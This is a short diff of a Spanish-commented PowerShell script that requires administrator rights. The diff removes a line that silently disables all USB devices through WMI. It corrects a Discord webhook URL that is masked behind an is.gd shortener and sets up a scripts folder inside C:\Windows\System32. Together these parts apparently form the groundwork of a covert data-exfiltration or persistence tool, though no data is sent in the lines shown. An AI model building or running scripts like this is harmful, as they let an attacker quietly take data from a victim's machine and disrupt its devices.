@@ -5,11 +5,8 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Exit
 }
 
-# Forzar cambios en los dispositivos USB sin mostrar mensaje de Windows
-(Get-WmiObject -Class Win32_PnPEntity | Where-Object { $_.Name -like "*USB*" }).Disable()
-
 # Definir la URL del webhook de Discord
-$hookurl = "Uhttps://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord
+$hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord
 
 # Definir el nombre del directorio y el script
 $directoryName = "C:\Windows\System32\Scripts"
